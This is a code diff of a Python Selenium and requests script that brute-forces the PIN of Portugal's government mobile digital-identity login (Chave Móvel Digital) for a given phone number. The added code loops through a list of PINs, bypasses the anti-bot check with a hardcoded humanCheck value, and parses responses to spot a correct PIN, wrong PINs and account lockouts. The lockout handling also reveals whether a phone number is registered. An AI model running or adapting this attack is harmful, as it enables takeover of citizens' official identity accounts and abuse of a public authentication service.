@@ -24,12 +24,9 @@ def get_requests_session_obj_from_driver(driver):
         session.cookies.set(cookie['name'], cookie['value'])
     return session
 
-def attempt_login(driver, phone, pin):
+def attempt_login(session, data, phone, pin):
     POST_URL = 'https://cmd.autenticacao.gov.pt/Ama.Authentication.Frontend/Processes/Authentication/MobileAuthentication.aspx'
 
-    session = get_requests_session_obj_from_driver(driver)
-    data = parse_form_data_from_HTML(driver.page_source, '+351 961111111', '1234')
-    
     headers = {
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
         'Accept-Encoding': 'gzip, deflate, br',
@@ -45,8 +42,7 @@ def attempt_login(driver, phone, pin):
 
     }
     res = session.post(POST_URL, data=data, headers=headers)
-    import pdb; pdb.set_trace()
-
+    return res
 
 def attempt_login_webdriver(driver, phone, pin):
     hidden_mobile_number_elem = driver.find_element_by_id('MainContent_hiddenMobile')
@@ -58,9 +54,9 @@ def get_attr_value_from_elem_id(bs, elem_id, attr_name):
     return elem_value
 
 def parse_form_data_from_HTML(html, phone, pin):
-    bs = BeautifulSoup(html)
+    bs = BeautifulSoup(html, 'html.parser')
 
-    human_check = get_attr_value_from_elem_id(bs, 'humanCheck', 'value')
+    human_check = '8FBB298A-DE46-4657-88E8-95F1F1224784'
     event_target = get_attr_value_from_elem_id(bs, '__EVENTTARGET', 'value')
     event_argument = get_attr_value_from_elem_id(bs, '__EVENTARGUMENT', 'value')
     view_state = get_attr_value_from_elem_id(bs, '__VIEWSTATE', 'value')
@@ -80,12 +76,72 @@ def parse_form_data_from_HTML(html, phone, pin):
 
     return data
 
+def is_pin_valid(html):
+    WRONG_PIN_TEXT = 'O número de telemóvel ou o PIN estão errados ou registo inexistente'
+    bs = BeautifulSoup(html, 'html.parser')
+
+    elem = bs.find(id='MainContent_lblMsgError')
+
+    if elem.text == WRONG_PIN_TEXT:
+        print('\tWRONG PIN')
+        return False
+    elif bs.find(id='MainContent_txtMobileTAN') is not None:
+        # Second factor auth box found, PIN has been succesfully guessed
+        print('\t***SUCCESS***')
+        return True
+    elif elem.text.startswith('A sua conta encontra-se temporariamente bloqueada'):
+        print('This phone number is registered!')
+        import pdb; pdb.set_trace()
+    else:
+        # TODO: your session might've been timed out, all you have to do
+        # is return the remanining PIN attempts list and re-do the
+        # authentication chain with the driver
+        # I'll do this when I have time
+        # RAISE an exception here
+        import pdb; pdb.set_trace()
+        pass
+
+def bruteforce_login(driver, phone_number, pin_list):
+
+    num_pins = len(pin_list)
+    num_attempts = 0
+
+    session = get_requests_session_obj_from_driver(driver)
+
+    first_pin = pin_list[0]
+    pin_list = pin_list[1:]
+
+    num_attempts += 1
+    print('Trying: {}:{} [{}/{}]'.format(phone_number, first_pin, num_attempts, num_pins))
+
+    data = parse_form_data_from_HTML(driver.page_source, phone_number, first_pin)
+    res = attempt_login(session, data, phone_number, first_pin)
+
+    if (is_pin_valid(res.content)):
+        return True
+
+    for pin in pin_list:
+        num_attempts += 1
+        print('Trying: {}:{} [{}/{}]'.format(phone_number, pin, num_attempts, num_pins))
+
+        data = parse_form_data_from_HTML(res.content, phone_number, pin)
+        #import pdb; pdb.set_trace()
+        res = attempt_login(session, data, phone_number, pin)
+
+        if is_pin_valid(res.content):
+            return True
+
+    print('FAILED to find PIN')
+    return False
+
 driver = webdriver.Chrome()
 driver.implicitly_wait(10)
 
 go_to_login_page(driver)
 
-attempt_login(driver, '+351 961111111', '1234')
+phone_number = '+351 910000000'
+pin_list = ['1992', '2005', '2001']*999
 
-import pdb; pdb.set_trace()
+bruteforce_login(driver, phone_number, pin_list)
+
 driver.close()
